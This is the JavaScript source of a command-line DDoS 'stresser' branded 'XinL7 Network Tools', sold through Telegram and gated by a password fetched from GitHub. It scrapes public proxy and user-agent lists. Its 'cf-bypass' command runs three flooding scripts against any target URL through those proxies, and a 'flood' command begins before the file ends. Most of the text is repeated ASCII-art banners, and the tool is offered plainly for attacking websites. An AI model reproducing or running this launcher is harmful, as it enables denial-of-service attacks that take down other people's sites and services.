const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.0.0'
let processList = [];
const Concurrents = '1/1'
const owner = 'XinL7' 
const cyan = '\x1b[96m'
const bold = '\x1b[1m';
const back_putih = '\x1b[48;5;255m';
const teksungu = '\x1b[31m';
const Reset = '\x1b[0m';
const biru = '\x1b[36m'
const hijau = '\x1b[38;2;144;238;144m'
const teks_hitam = '\x1b[30m'; // Teks hitam🕊🪽
const back_biru = '\x1b[44m'; // Latar belakang biru🕊🪽
const back_ungu = '\x1b[45m'; // Latar belakang ungu🕊🪽
const back_biru_ungu = '\x1b[48;2;128;0;255m';
const { parsePhoneNumberFromString, getCountryCallingCode } = require('libphonenumber-js');
const carrier = require('libphonenumber-js/metadata.min.json');  // Pustaka metadata untuk detail negara🕊🪽
const geocoder = require('libphonenumber-js/metadata.min.json'); // Pustaka metadata untuk detail geografi🕊🪽

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
    console.clear();
    console.log(`${bold}`);
    console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}
_________________________________________________________________________________________
\x1b[1m
\x1b[31m| \x1b[34mUSER: \x1b[32mROOT \x1b[31m| \x1b[34mVIP: \x1b[32mAKTIF \x1b[31m| \x1b[34mSUPERVIP: \x1b[32mAKTIF
\x1b[31m| \x1b[34mADMIN:\x1b[32m XinL7🕊️🪽 \x1b[31m| \x1b[34m𝑬𝒙𝒑𝒊𝒓𝒆𝒅:\x1b[32m 999999\x1b[31m | \x1b[34mTIME LIMIT: \x1b[32m999999 
\x1b[31m| \x1b[36mXinL7 Network Tools \x1b[31m| \x1b[36mt.me/XinyouXD\x1b[0m
Type ${bold}${back_biru_ungu}"Botnetsrv"${Reset} For Showing All Server Menu ${bold}${back_biru_ungu}"Menu"${Reset}
========================================================================`)}
// [========================================] //
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data🕊️🪽: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data🕊️🪽: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    // Clear the console screen first🕊🪽
    console.clear();
    
    // Display the banner🕊🪽
    console.log(`            
 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${teksungu}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
${back_biru_ungu}${teksungu} Welcome The XinL7 Network Tools Input User And Pasword${Reset}                                                                               
    `);

    // Fetch the username from the new URL🕊🪽
    const usernameResponse = await fetch('https://raw.githubusercontent.com/Langzyy999/cache/main/sigma.txt');
    const validUsername = await usernameResponse.text(); // Expected to get the username from the text🕊🪽

    // Fetch the password from the new URL🕊🪽
    const passwordResponse = await fetch('https://raw.githubusercontent.com/Langzyy999/cache/main/sigma.txt');
    const validPassword = await passwordResponse.text(); // Expected to get the password from the text🕊🪽

    // Prompt for username🕊🪽
    permen.question(`${back_biru_ungu}${teksungu}Input The Username${Reset}: `, (username) => {
      if (username.trim() === validUsername.trim()) {
        // If username is correct, prompt for password🕊🪽
        permen.question(`${back_biru_ungu}${teksungu}Input The Pasword${Reset}: `, (password) => {
          if (password.trim() === validPassword.trim()) {
            // Successful login🕊🪽
            console.log(`SuccesFuly login to XinL7 Network!`);
            console.clear();
            console.log(`Welcome To ${biru}XinL7 Network Tools${Reset} ${hijau}Tools${Reset}${version}`);
            sleep(1000); // No need for await if sleep is synchronous🕊🪽
            banner();
            console.log(`Type ${back_biru_ungu}"Menu"${Reset} For Showing All Menu XinL7 Network Tools.`);
            sigma();
          } else {
            // Wrong password🕊🪽
            console.log(`Buy Script?Dm Tele @XinyouXD`);
            process.exit(-1);
          }
        });
      } else {
        // Wrong username🕊🪽
        console.log(`Buy Script?Dm Tele @XinyouXD`);
        process.exit(-1);
      }
    });
  } catch (error) {
    console.log(`🚨 Jaringan Anda sedang sibuk , Coba lain kali saja`);
  }
}
// [========================================] //
async function cfbypass(args) {
  if (args.length < 3) {
    console.log(`Example: cf-bypass <Target> <Duration>
cf-bypass https://website.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[41m\x1b[41m!\x1b[0m ATTACK SUCCESFULY SENT TO ATTACK WEBSITE \x1b[41m\x1b[41m!\x1b[0m
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
┃\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
┃\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
┃\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36mCF-BYPASS\x1b[1;35m]
┃\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36mXinL7 Network Tools\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
┃\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
const tlsv1 = path.join(__dirname, `/lib/cache/tlsnet.js`);
const mabukcinta = path.join(__dirname, `/lib/cache/priv.js`);
const bypass = path.join(__dirname, `/lib/cache/xlamper.js`);
        exec(`node ${tlsv1} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${mabukcinta} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${bypass} ${target} ${duration} 80 10 proxy.txt`)
sigma()
};
// [========================================] //
async function flood(args) {
  if (args.length < 3) {
    console.log(`Example: Flood <Target> <Duration>
Flood https://website.com 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
${hijau}[ SYSTEM ] ${teksungu}WELCOME TO XINL7 TOOLS${Reset}${bold}
${hijau}[ SYSTEM ] ${teksungu}OWNER TOOLS @XinyouXD${Reset}${bold}

 ${cyan}⢸⠉⣹⠋⠉⢉⡟⢩⢋⠋⣽⡻⠭⢽⢉⠯⠭⠭⠭⢽⡍⢹⡍⠙⣯⠉⠉⠉⠉⠉⣿⢫⠉⠉⠉⢉⡟⠉⢿⢹⠉⢉⣉⢿⡝⡉⢩⢿⣻⢍⠉⠉⠩⢹⣟⡏⠉⠹⡉⢻⡍⡇
⠀⢸⢠⢹⠀⠀⢸⠁⣼⠀⣼⡝⠀⠀⢸⠘⠀⠀⠀⠀⠈⢿⠀⡟⡄⠹⣣⠀⠀⠐⠀⢸⡘⡄⣤⠀⡼⠁⠀⢺⡘⠉⠀⠀⠀⠫⣪⣌⡌⢳⡻⣦⠀⠀⢃⡽⡼⡀⠀⢣⢸⠸⡇
⠀⢸⡸⢸⠀⠀⣿⠀⣇⢠⡿⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠘⢇⠸⠘⡀⠻⣇⠀⠀⠄⠀⡇⢣⢛⠀⡇⠀⠀⣸⠇⠀⠀⠀⠀⠀⠘⠄⢻⡀⠻⣻⣧⠀⠀⠃⢧⡇⠀⢸⢸⡇⡇
⠀⢸⡇⢸⣠⠀⣿⢠⣿⡾⠁⠀⢀⡀⠤⢇⣀⣐⣀⠀⠤⢀⠈⠢⡡⡈⢦⡙⣷⡀⠀⠀⢿⠈⢻⣡⠁⠀⢀⠏⠀⠀⠀⢀⠀⠄⣀⣐⣀⣙⠢⡌⣻⣷⡀⢹⢸⡅⠀⢸⠸⡇⡇
⠀⢸⡇⢸⣟⠀⢿⢸⡿⠀⣀⣶⣷⣾⡿⠿⣿⣿⣿⣿⣿⣶⣬⡀⠐⠰⣄⠙⠪⣻⣦⡀⠘⣧⠀⠙⠄⠀⠀⠀⠀⠀⣨⣴⣾⣿⠿⣿⣿⣿⣿⣿⣶⣯⣿⣼⢼⡇⠀⢸⡇⡇⡇
⠀⢸⢧⠀⣿⡅⢸⣼⡷⣾⣿⡟⠋⣿⠓⢲⣿⣿⣿⡟⠙⣿⠛⢯⡳⡀⠈⠓⠄⡈⠚⠿⣧⣌⢧⠀⠀⠀⠀⠀⣠⣺⠟⢫⡿⠓⢺⣿⣿⣿⠏⠙⣏⠛⣿⣿⣾⡇⢀⡿⢠⠀⡇
⠀⢸⢸⠀⢹⣷⡀⢿⡁⠀⠻⣇⠀⣇⠀⠘⣿⣿⡿⠁⠐⣉⡀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠳⠄⠀⠀⠀⠀⠋⠀⠘⡇⠀⠸⣿⣿⠟⠀⢈⣉⢠⡿⠁⣼⠁⣼⠃⣼⠀⡇
⠀⢸⠸⣀⠈⣯⢳⡘⣇⠀⠀⠈⡂⣜⣆⡀⠀⠀⢀⣀⡴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣆⣀⠀⠀⠀⣀⣜⠕⡊⠀⣸⠇⣼⡟⢠⠏⠀⡇
⠀⢸⠀⡟⠀⢸⡆⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⣾⡏⡇⡎⡇⠀⡇
⠀⢸⠀⢃⡆⠀⢿⡄⠑⢽⣄⠀⠀⠀⢀⠂⠠⢁⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡐⢀⠂⠀⠀⣠⣮⡟⢹⣯⣸⣱⠁⠀⡇
⠀⠈⠉⠉⠋⠉⠉⠋⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠋⡟⠉⠉⡿⠋⠋⠋⠉⠉⠁${Reset}${bold}
\x1b[34m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Owner XinL7 : L7XinID🕊️🪽${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Telegram XinL7 : t.me/XinyouXD${Reset}${bold}
\x1b[34m┃${hijau}[ SYSTEM ]${teksungu} Support : t.me/xeonci${Reset}${bold}
\x1b[34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${bold}${hijau}🚀𝐂2 𝗫𝗜𝗡𝗟𝟳 𝐒𝐓𝐑𝐄𝐒𝐒𝐄𝐑 , 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐀𝐓𝐓𝐀𝐂𝐊 𝐖𝐄𝐁𝐒𝐈𝐓𝐄𝐒🚀${Reset}⠀⠀⠀⠀⠀⠀⠀⠀
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[41m\x1b[41m!\x1b[0m ATTACK SUCCESFULY SENT TO ATTACK WEBSITE \x1b[41m\x1b[41m!\x1b[0m
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
┃\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
┃\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
┃\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36mFLOOD\x1b[1;35m]
┃\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36mXinL7 Network Tools\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
┃\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
┃\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
